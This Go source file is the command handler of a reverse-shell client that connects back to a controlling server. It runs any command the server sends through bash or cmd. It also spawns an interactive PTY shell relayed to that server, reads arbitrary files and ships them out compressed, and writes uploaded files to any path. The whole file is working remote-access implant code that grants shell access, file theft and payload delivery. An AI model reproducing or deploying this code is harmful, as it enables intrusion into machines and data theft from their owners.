package client

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"github.com/creack/pty"
	"golang-https-rev/pkg/compression"
	"golang-https-rev/pkg/protocol"
)

// handlePingCommand handles PING requests from the server
func (rc *ReverseClient) handlePingCommand() error {
	rc.writer.WriteString(protocol.CmdPong + "\n" + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// handleStartUploadCommand handles the START_UPLOAD command to prepare for file upload
func (rc *ReverseClient) handleStartUploadCommand(command string) error {
	parts := strings.SplitN(command, " ", 3)
	if len(parts) != 3 {
		rc.writer.WriteString("Invalid start_upload command\n" + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("invalid start_upload command: %s", command)
	}
	remotePath := parts[1]
	rc.currentUploadPath = remotePath
	rc.uploadChunks = []string{}
	rc.writer.WriteString("OK\n" + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// handleUploadChunkCommand handles receiving and storing a single file chunk
func (rc *ReverseClient) handleUploadChunkCommand(command string) error {
	if rc.currentUploadPath == "" {
		rc.writer.WriteString("No active upload\n" + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("no active upload session")
	}
	chunk := strings.TrimPrefix(command, protocol.CmdUploadChunk+" ")
	rc.uploadChunks = append(rc.uploadChunks, chunk)
	rc.writer.WriteString("OK\n" + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// handleEndUploadCommand handles finalizing a file upload and writing to disk
func (rc *ReverseClient) handleEndUploadCommand(command string) error {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		rc.writer.WriteString("Invalid end_upload command\n" + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("invalid end_upload command: %s", command)
	}

	if rc.currentUploadPath == "" {
		rc.writer.WriteString("No active upload\n" + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("no active upload session")
	}

	// Decompress and write chunks to file
	decompressedData := []byte{}
	for _, chunk := range rc.uploadChunks {
		decompressed, err := compression.DecompressHex(chunk)
		if err != nil {
			rc.writer.WriteString(fmt.Sprintf("Decompression error: %v\n", err) + protocol.EndOfOutputMarker + "\n")
			rc.writer.Flush()
			return fmt.Errorf("decompression failed: %w", err)
		}
		decompressedData = append(decompressedData, decompressed...)
	}

	// Write to file
	err := os.WriteFile(rc.currentUploadPath, decompressedData, 0644)
	if err != nil {
		rc.writer.WriteString(fmt.Sprintf("Write error: %v\n", err) + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("failed to write file: %w", err)
	}

	totalBytes := len(decompressedData)
	rc.writer.WriteString(fmt.Sprintf("OK\n%d\n", totalBytes) + protocol.EndOfOutputMarker + "\n")
	rc.writer.Flush()

	// Cleanup
	rc.currentUploadPath = ""
	rc.uploadChunks = []string{}
	return nil
}

// handleDownloadCommand handles file download requests
func (rc *ReverseClient) handleDownloadCommand(command string) error {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		rc.writer.WriteString("Invalid download command\n" + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("invalid download command: %s", command)
	}

	filePath := parts[1]
	data, err := os.ReadFile(filePath)
	if err != nil {
		rc.writer.WriteString(fmt.Sprintf("Error reading file: %v\n", err) + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("failed to read file: %w", err)
	}

	// Compress data
	compressed, err := compression.CompressToHex(data)
	if err != nil {
		rc.writer.WriteString(fmt.Sprintf("Compression error: %v\n", err) + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("compression failed: %w", err)
	}

	rc.writer.WriteString(protocol.DataPrefix + compressed + "\n" + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// handleExitCommand handles the EXIT command to gracefully close connection
func (rc *ReverseClient) handleExitCommand() error {
	return nil // Signal to return from main loop
}

// handlePtyModeCommand enters PTY mode and spawns an interactive shell
func (rc *ReverseClient) handlePtyModeCommand() error {
	if rc.inPtyMode {
		rc.writer.WriteString("Already in PTY mode\n" + protocol.EndOfOutputMarker + "\n")
		return rc.writer.Flush()
	}

	// Determine shell
	shell := "/bin/bash"
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else if _, err := os.Stat(shell); os.IsNotExist(err) {
		shell = "/bin/sh"
	}

	// Start shell in PTY
	cmd := exec.Command(shell)
	ptmx, err := pty.Start(cmd)
	if err != nil {
		rc.writer.WriteString(fmt.Sprintf("Failed to start PTY: %v\n", err) + protocol.EndOfOutputMarker + "\n")
		return rc.writer.Flush()
	}

	rc.ptyFile = ptmx
	rc.ptyCmd = cmd
	rc.inPtyMode = true

	// Send confirmation
	rc.writer.WriteString("OK\n" + protocol.EndOfOutputMarker + "\n")
	if err := rc.writer.Flush(); err != nil {
		return err
	}

	// Capture the current ptmx for the goroutine so it doesn't use a stale reference
	currentPtyFile := ptmx
	currentPtyCmd := cmd

	// Start goroutine to forward PTY output to server
	go func() {
		buf := make([]byte, 4096)
		for {
			// Check if we've exited PTY mode or switched to a different PTY
			rc.ptyMutex.Lock()
			stillActive := rc.inPtyMode && rc.ptyFile == currentPtyFile
			rc.ptyMutex.Unlock()
			
			if !stillActive {
				break
			}
			
			n, err := currentPtyFile.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Printf("PTY read error: %v (shell may have exited)", err)
				}
				break
			}
			if n > 0 {
				// Double-check we're still in the same PTY session
				rc.ptyMutex.Lock()
				stillActive := rc.inPtyMode && rc.ptyFile == currentPtyFile
				rc.ptyMutex.Unlock()
				
				if !stillActive {
					break
				}
				// Compress and encode PTY data as hex
				encoded, err := compression.CompressToHex(buf[:n])
				if err != nil {
					log.Printf("Error encoding PTY data: %v", err)
					continue
				}
				rc.writer.WriteString(protocol.CmdPtyData + " " + encoded + "\n")
				rc.writer.Flush()
			}
		}
		
		// Wait for the shell process to exit
		if currentPtyCmd.Process != nil {
			currentPtyCmd.Wait()
		}
		
		// PTY closed, exit PTY mode with proper synchronization
		rc.ptyMutex.Lock()
		// Only clean up if we're still in the same PTY session
		if rc.inPtyMode && rc.ptyFile == currentPtyFile {
			log.Printf("PTY shell exited, cleaning up")
			rc.inPtyMode = false
			if rc.ptyFile != nil {
				rc.ptyFile.Close()
			}
			rc.ptyFile = nil
			rc.ptyCmd = nil
			rc.ptyMutex.Unlock()
			
			rc.writer.WriteString(protocol.CmdPtyExit + "\n")
			rc.writer.Flush()
		} else {
			rc.ptyMutex.Unlock()
		}
	}()

	return nil
}

// handlePtyDataCommand forwards data to the PTY
func (rc *ReverseClient) handlePtyDataCommand(command string) error {
	rc.ptyMutex.Lock()
	ptyActive := rc.inPtyMode && rc.ptyFile != nil
	ptyFile := rc.ptyFile
	rc.ptyMutex.Unlock()
	
	if !ptyActive {
		return fmt.Errorf("not in PTY mode")
	}

	encoded := strings.TrimPrefix(command, protocol.CmdPtyData+" ")
	// Decompress hex data
	data, err := compression.DecompressHex(encoded)
	if err != nil {
		return fmt.Errorf("failed to decompress PTY data: %v", err)
	}
	_, err = ptyFile.Write(data)
	return err
}

// handlePtyResizeCommand handles window resize for PTY
func (rc *ReverseClient) handlePtyResizeCommand(command string) error {
	rc.ptyMutex.Lock()
	ptyActive := rc.inPtyMode && rc.ptyFile != nil
	ptyFile := rc.ptyFile
	rc.ptyMutex.Unlock()
	
	if !ptyActive {
		return fmt.Errorf("not in PTY mode")
	}

	parts := strings.Fields(command)
	if len(parts) != 3 {
		return fmt.Errorf("invalid resize command: %s", command)
	}

	rows, err := strconv.Atoi(parts[1])
	if err != nil {
		return fmt.Errorf("invalid rows: %v", err)
	}

	cols, err := strconv.Atoi(parts[2])
	if err != nil {
		return fmt.Errorf("invalid cols: %v", err)
	}

	// Set window size
	ws := &winsize{
		Row: uint16(rows),
		Col: uint16(cols),
	}
	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		uintptr(ptyFile.Fd()),
		uintptr(syscall.TIOCSWINSZ),
		uintptr(unsafe.Pointer(ws)),
	)
	if errno != 0 {
		return fmt.Errorf("ioctl TIOCSWINSZ failed: %v", errno)
	}

	return nil
}

// handlePtyExitCommand exits PTY mode
func (rc *ReverseClient) handlePtyExitCommand() error {
	rc.ptyMutex.Lock()
	defer rc.ptyMutex.Unlock()
	
	if !rc.inPtyMode {
		return nil
	}

	log.Printf("Exiting PTY mode (requested by listener)")
	rc.inPtyMode = false

	if rc.ptyCmd != nil && rc.ptyCmd.Process != nil {
		rc.ptyCmd.Process.Kill()
	}

	if rc.ptyFile != nil {
		rc.ptyFile.Close()
		rc.ptyFile = nil
	}

	rc.ptyCmd = nil

	rc.writer.WriteString("Exited PTY mode\n" + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// winsize struct for PTY window size
type winsize struct {
	Row uint16
	Col uint16
	X   uint16
	Y   uint16
}

// handleShellCommand executes a shell command and returns output
func (rc *ReverseClient) handleShellCommand(command string) error {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("bash", "-c", command)
	}

	// Store reference to running command for cancellation
	rc.runningCmd = cmd
	defer func() { rc.runningCmd = nil }()

	// Stream output with size limit to handle long-running commands
	maxLen := protocol.MaxBufferSize
	output := make([]byte, 0, 8192)
	truncated := false

	pipe, err := cmd.StdoutPipe()
	if err != nil {
		rc.writer.WriteString(fmt.Sprintf("Error creating pipe: %v\n", err) + protocol.EndOfOutputMarker + "\n")
		return rc.writer.Flush()
	}
	cmd.Stderr = cmd.Stdout

	if err := cmd.Start(); err != nil {
		rc.writer.WriteString(fmt.Sprintf("Error starting command: %v\n", err) + protocol.EndOfOutputMarker + "\n")
		return rc.writer.Flush()
	}

	// Read output up to maxLen
	buf := make([]byte, 4096)
	for len(output) < maxLen {
		n, readErr := pipe.Read(buf)
		if n > 0 {
			remaining := maxLen - len(output)
			if n > remaining {
				output = append(output, buf[:remaining]...)
				truncated = true
				break
			}
			output = append(output, buf[:n]...)
		}
		if readErr != nil {
			break
		}
	}

	// If truncated, kill the process to avoid blocking on cmd.Wait()
	if truncated {
		cmd.Process.Kill()
		output = append(output, []byte("\n...output truncated\n")...)
	}

	// Wait for command to finish
	cmd.Wait()

	rc.writer.WriteString(string(output) + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// processCommand processes a single command and returns whether to continue
func (rc *ReverseClient) processCommand(command string) (shouldContinue bool, err error) {
	// Handle keepalive ping
	if command == protocol.CmdPing {
		return true, rc.handlePingCommand()
	}

	// Log command but avoid logging data payloads for upload chunks
	if strings.HasPrefix(command, protocol.CmdUploadChunk+" ") {
		log.Printf("Received command: %s <data>", protocol.CmdUploadChunk)
	} else {
		log.Printf("Received command: %s", command)
	}

	if command == protocol.CmdExit {
		return false, rc.handleExitCommand()
	}

	// Handle PTY mode commands
	if command == protocol.CmdPtyMode {
		return true, rc.handlePtyModeCommand()
	}

	if strings.HasPrefix(command, protocol.CmdPtyData+" ") {
		return true, rc.handlePtyDataCommand(command)
	}

	if strings.HasPrefix(command, protocol.CmdPtyResize+" ") {
		return true, rc.handlePtyResizeCommand(command)
	}

	if command == protocol.CmdPtyExit {
		return true, rc.handlePtyExitCommand()
	}

	// Handle file transfers
	if strings.HasPrefix(command, protocol.CmdStartUpload+" ") {
		return true, rc.handleStartUploadCommand(command)
	}

	if strings.HasPrefix(command, protocol.CmdUploadChunk+" ") {
		return true, rc.handleUploadChunkCommand(command)
	}

	if strings.HasPrefix(command, protocol.CmdEndUpload+" ") {
		return true, rc.handleEndUploadCommand(command)
	}

	if strings.HasPrefix(command, protocol.CmdDownload+" ") {
		return true, rc.handleDownloadCommand(command)
	}

	// Default: execute as shell command
	return true, rc.handleShellCommand(command)
}
